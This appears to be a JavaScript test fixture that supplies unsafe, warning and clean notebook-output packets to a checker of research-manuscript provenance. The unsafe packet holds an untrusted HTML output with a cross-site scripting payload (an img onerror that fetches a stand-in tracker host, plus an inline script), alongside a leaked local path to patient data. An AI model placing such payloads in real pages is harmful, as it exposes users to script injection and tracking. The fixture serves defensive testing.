const unsafePacket = {
  packetId: 'notebook-output-packet-unsafe',
  workspaceId: 'workspace-neuro-42',
  manuscriptId: 'ms-neuro-response',
  receivedAt: '2026-05-28T10:15:00Z',
  currentDataRevisionAt: '2026-05-28T09:40:00Z',
  currentNotebookRevisionAt: '2026-05-28T09:45:00Z',
  currentSectionVersions: {
    results: 'sec-results-v9'
  },
  acceptedDependencyLocks: {
    'nb-response-model': {
      digest: 'sha256:lockfile-current-77a',
      updatedAt: '2026-05-28T09:50:00Z'
    }
  },
  cells: [
    {
      id: 'cell-load-data',
      notebookId: 'nb-response-model',
      sectionId: 'results',
      sectionVersion: 'sec-results-v8',
      executionCount: 12,
      lastExecutedAt: '2026-05-28T09:30:00Z',
      kernel: {
        name: 'python',
        version: '3.11.8'
      },
      dependencyLock: {
        manager: 'pip-tools',
        digest: 'sha256:lockfile-old-12b'
      },
      stochastic: false,
      inputs: [
        { id: 'cohort-export', path: 'restricted-dataset/cohort.csv' }
      ],
      outputs: [
        {
          mime: 'text/plain',
          content: 'Loaded cohort from /Users/alex/private-lab/patient-export/cohort.csv',
          trusted: true
        }
      ]
    },
    {
      id: 'cell-fit-model',
      notebookId: 'nb-response-model',
      sectionId: 'results',
      sectionVersion: 'sec-results-v9',
      executionCount: 14,
      lastExecutedAt: '2026-05-28T10:00:00Z',
      kernel: {
        name: 'python',
        version: '3.11.8',
        runtimeDigest: 'sha256:runtime-current'
      },
      dependencyLock: {
        manager: 'pip-tools',
        digest: 'sha256:lockfile-current-77a'
      },
      stochastic: true,
      inputs: [
        { id: 'cohort-export', digest: 'sha256:cohort-stable' }
      ],
      outputs: [
        {
          mime: 'text/html',
          content: '<img src="plot.png" onerror="fetch(\'https://tracker.example\')"><script>alert("x")</script>',
          trusted: false
        }
      ]
    },
    {
      id: 'cell-render-figure',
      notebookId: 'nb-response-model',
      sectionId: 'results',
      sectionVersion: 'sec-results-v9',
      executionCount: 14,
      lastExecutedAt: '2026-05-28T10:04:00Z',
      kernel: {
        name: 'python',
        version: '3.11.8',
        runtimeDigest: 'sha256:runtime-current'
      },
      dependencyLock: {
        manager: 'pip-tools',
        digest: 'sha256:lockfile-current-77a'
      },
      stochastic: false,
      inputs: [
        { id: 'model-summary', digest: 'sha256:model-summary' }
      ],
      outputs: [
        {
          mime: 'image/svg+xml',
          content: '<svg><text>Response model</text></svg>',
          trusted: true
        }
      ]
    }
  ]
};

const warningPacket = {
  packetId: 'notebook-output-packet-warning',
  workspaceId: 'workspace-neuro-42',
  manuscriptId: 'ms-neuro-response',
  receivedAt: '2026-05-28T10:25:00Z',
  currentDataRevisionAt: '2026-05-28T09:40:00Z',
  currentNotebookRevisionAt: '2026-05-28T09:45:00Z',
  currentSectionVersions: {
    methods: 'sec-methods-v3'
  },
  acceptedDependencyLocks: {
    'nb-methods-audit': {
      digest: 'sha256:lockfile-methods',
      updatedAt: '2026-05-28T09:41:00Z'
    }
  },
  cells: [
    {
      id: 'cell-methods-summary',
      notebookId: 'nb-methods-audit',
      sectionId: 'methods',
      sectionVersion: 'sec-methods-v3',
      executionCount: 1,
      lastExecutedAt: '2026-05-28T10:20:00Z',
      kernel: {
        name: 'python',
        version: '3.11.8'
      },
      dependencyLock: {
        manager: 'pip-tools',
        digest: 'sha256:lockfile-methods'
      },
      stochastic: false,
      inputs: [
        { id: 'protocol-yaml', digest: 'sha256:protocol-v3' }
      ],
      outputs: [
        {
          mime: 'text/markdown',
          content: 'Protocol audit matched the locked methods section.',
          trusted: true
        }
      ]
    }
  ]
};

const cleanPacket = {
  packetId: 'notebook-output-packet-clean',
  workspaceId: 'workspace-neuro-42',
  manuscriptId: 'ms-neuro-response',
  receivedAt: '2026-05-28T10:35:00Z',
  currentDataRevisionAt: '2026-05-28T09:40:00Z',
  currentNotebookRevisionAt: '2026-05-28T09:45:00Z',
  currentSectionVersions: {
    results: 'sec-results-v9'
  },
  acceptedDependencyLocks: {
    'nb-response-model': {
      digest: 'sha256:lockfile-current-77a',
      updatedAt: '2026-05-28T09:50:00Z'
    }
  },
  cells: [
    {
      id: 'cell-clean-load',
      notebookId: 'nb-response-model',
      sectionId: 'results',
      sectionVersion: 'sec-results-v9',
      executionCount: 1,
      lastExecutedAt: '2026-05-28T10:05:00Z',
      kernel: {
        name: 'python',
        version: '3.11.8',
        runtimeDigest: 'sha256:runtime-current'
      },
      dependencyLock: {
        manager: 'pip-tools',
        digest: 'sha256:lockfile-current-77a'
      },
      stochastic: false,
      inputs: [
        { id: 'cohort-export', digest: 'sha256:cohort-stable' }
      ],
      outputs: [
        {
          mime: 'text/plain',
          content: 'Loaded 128 anonymized rows from cohort artifact sha256:cohort-stable.',
          trusted: true
        }
      ]
    },
    {
      id: 'cell-clean-fit',
      notebookId: 'nb-response-model',
      sectionId: 'results',
      sectionVersion: 'sec-results-v9',
      executionCount: 2,
      lastExecutedAt: '2026-05-28T10:08:00Z',
      kernel: {
        name: 'python',
        version: '3.11.8',
        runtimeDigest: 'sha256:runtime-current'
      },
      dependencyLock: {
        manager: 'pip-tools',
        digest: 'sha256:lockfile-current-77a'
      },
      stochastic: true,
      randomSeed: {
        value: 20260528,
        capturedAt: '2026-05-28T10:07:59Z'
      },
      inputs: [
        { id: 'cohort-export', digest: 'sha256:cohort-stable' }
      ],
      outputs: [
        {
          mime: 'text/markdown',
          content: 'Model AUC: 0.82. Bootstrap CI generated with seed 20260528.',
          trusted: true
        }
      ]
    }
  ]
};

module.exports = {
  unsafePacket,
  warningPacket,
  cleanPacket
};
